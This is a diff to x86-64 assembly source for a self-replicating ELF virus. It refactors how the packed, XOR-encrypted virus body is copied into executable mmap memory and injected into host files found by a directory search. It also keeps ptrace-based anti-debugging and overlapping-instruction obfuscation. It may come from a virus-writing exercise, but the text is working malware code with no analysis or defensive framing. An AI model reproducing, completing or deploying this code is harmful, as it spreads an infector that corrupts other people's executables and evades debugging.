@@ -60,6 +60,7 @@ _h3ll0w0rld:
 	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
 	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
 	jmp .dont_gdb_bro + 2
+	xor rax, rax
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
@@ -88,7 +89,8 @@ _h3ll0w0rld:
 		call _xor_encrypt
 		pop rdx
 
-	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
+	jmp .infected
+;	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
 	.happy_mix:
 	push 2
 	pop rdi
@@ -116,12 +118,12 @@ _h3ll0w0rld:
 	cmp rax, 0x0
 	jnz _exit
 
-	call _get_size_pack
-	push rax
-	pop r8
-
+	push r14
+	call _make_virus_map
 	; host part
 	call _search_dir
+	call _munmap_virus
+	pop r14
 	jmp _exit
 
 	.infected:
@@ -173,6 +175,7 @@ _virus:
 	push rdx
 	push r8
 	push r9
+	push r14
 
 	; copy the virus into a mmap executable
 	xor rdi, rdi; NULL
@@ -216,6 +219,7 @@ _virus:
 	pop rdi
 	pop rsi
 
+	pop r14
 	pop r9
 	pop r8
 
@@ -227,6 +231,7 @@ _virus:
 	add rax, rdi
 
 	push rdi ; save addr
+	mov r14, [rel length]
 
 	call rax ; jump to mmaped memory
 
@@ -702,17 +707,7 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdi, r13 ; addr pointer -> mmap
 
 			xor r9, r9
-			cmp r9, [rel entry_inject]
-			jne .infected
-
-			call _host_infect
-			cmp rax, 0x0
-			je .unmap
-
-			jmp .params
-
-			.infected:
-			mov rdx, [rel length]
+			mov rdx, r14
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 
@@ -724,7 +719,6 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rax, rdi
 			add rdx, 8 * 3
 
-			.params:
 			sub rax, 8 * 3
 
 			push rdi
@@ -1047,24 +1041,26 @@ _eof:
 
 ; don't need to copy the host part
 ; v
+_make_virus_map:
+	; copy the virus into a mmap executable
+	xor rdi, rdi; NULL
 
-; TODO: mix _get_size_pack / host_infect to do only 1 _pack --> FASTEEER
-_host_infect:
-	push rdi
-;	call _get_size_pack
-	mov rax, r8
-	lea r9, [rel _params]
-	lea rdi, [rel _pack_start]
-	sub rdi, r9
-	add rax, rdi
-	pop rdi
+	lea rsi, [rel _eof]
+	lea r8, [rel _params]
+	sub rsi, r8
+	push 7
+	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
+	push 34
+	pop r10; MAP_PRIVATE | MAP_ANON
+	push -1
+	pop r8 ; fd
+	xor r9, r9; offset
+	push SYSCALL_MMAP
+	pop rax; mmap
+	syscall
 
-	cmp rsi, rax
-	jl .return_error
-
-	; host
 	; ==		copy start of the virus
-	mov rax, rdi
+	mov rdi, rax
 	push rax; save
 
 	lea rsi, [rel _start]
@@ -1076,31 +1072,25 @@ _host_infect:
 	add rdi, rdx
 	call _pack
 	push rax
-	pop r9
-
-	; ==		change rdx, rax, rdi
-	add rdx, r9
-	pop rdi; mmap
-	mov rax, rdi
-
-	add rdx, 8 * 3
-	ret
-	.return_error:
-		xor rax, rax
+	pop r14; size
+	add r14, rdx
+	add r14, 8 * 3
+	pop r8
 ret
 
-_get_size_pack:
-	push rdi
-	push rsi
-		lea rdi, [rel _pack_start]
-		lea rsi, [rel _eof]
-		sub rsi, rdi
-		sub rsp, rsi
-		mov rdi, rsp
-		call _pack
-		add rsp, rsi
-	pop rsi
-	pop rdi
+_munmap_virus:
+	push r8
+	pop rdi ; pop addr
+;	push r14
+;	pop rsi ; pop length
+	lea rsi, [rel _eof]
+	lea r8, [rel _params]
+	sub rsi, r8
+
+	; munmap the previous exec
+	push SYSCALL_MUNMAP
+	pop rax
+	syscall
 ret
 
 ;               v dest
